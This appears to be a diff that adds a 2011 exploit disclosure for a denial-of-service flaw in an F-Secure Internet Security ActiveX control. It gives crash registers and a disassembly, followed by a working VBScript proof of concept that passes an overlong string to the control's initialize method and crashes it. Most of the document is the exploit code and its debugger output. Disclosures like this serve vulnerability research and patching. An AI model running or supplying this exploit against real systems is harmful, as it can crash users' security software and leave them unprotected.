@@ -1,0 +1,56 @@
+EXPLOIT TITLE : F-secure Internet Security 2011 ActiveX denial of service vulnerability (0-DAY)
+DATE : January,11, 2011
+Author : Mehdi Boukazoula , e-mail:mehdiboukazoula (ot) gmail (dot) com ; blog: http://elfanak.blogspot.com .
+Version : 2011
+Link to download : http://www.softpedia.com/progDownload/F-Secure-Internet-Security-Download-10610.html
+Tested on : windows xp SP2 (other may succed) .
+Technical details : 
+Registers:
+--------------------------------------------------
+EIP 17157F7C
+EAX 41414141
+EBX 41414141
+ECX 41414141
+EDX 0013E358 -> Asc: defaultV.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EDI 00AC21C4 -> 0017E588
+ESI 00AC21B0 -> 00A999E8
+EBP 00000000
+ESP 0013D8E4 -> 1715830D
+Block Disassembly: 
+--------------------------------------------------
+17157F6D	INT3
+17157F6E	INT3
+17157F6F	INT3
+17157F70	MOV ECX,[ESP+4]
+17157F74	TEST ECX,3
+17157F7A	JE SHORT 17157FA0
+17157F7C	MOV AL,[ECX]	  |---- CRASH here
+17157F7E	ADD ECX,1
+17157F81	TEST AL,AL
+17157F83	JE SHORT 17157FD3
+17157F85	TEST ECX,3
+17157F8B	JNZ SHORT 17157F7C
+17157F8D	ADD EAX,0
+17157F92	LEA ESP,[ESP]
+17157F99	LEA ESP,[ESP]
+
+<html>
+
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:147B3695-4308-41D9-B1A4-770B87BAD342' id='target' />
+<script language='vbscript'>
+'Wscript.echo typename(target)
+'for debugging/custom prolog
+targetFile = "%PROGRAM DIR%\F-Secure\Gadget\fsresh.dll"
+prototype  = "Function initialize ( ByVal resource_name As String ,  ByVal language_code As String ) As Boolean"
+memberName = "initialize"
+progid     = "resource_handlerLib.ResourceHandler"
+argCount   = 2
+
+arg1="defaultV"
+arg2=String(1000, "A")
+
+target.initialize arg1 ,arg2 
+
+</script></job></package>
+</html>
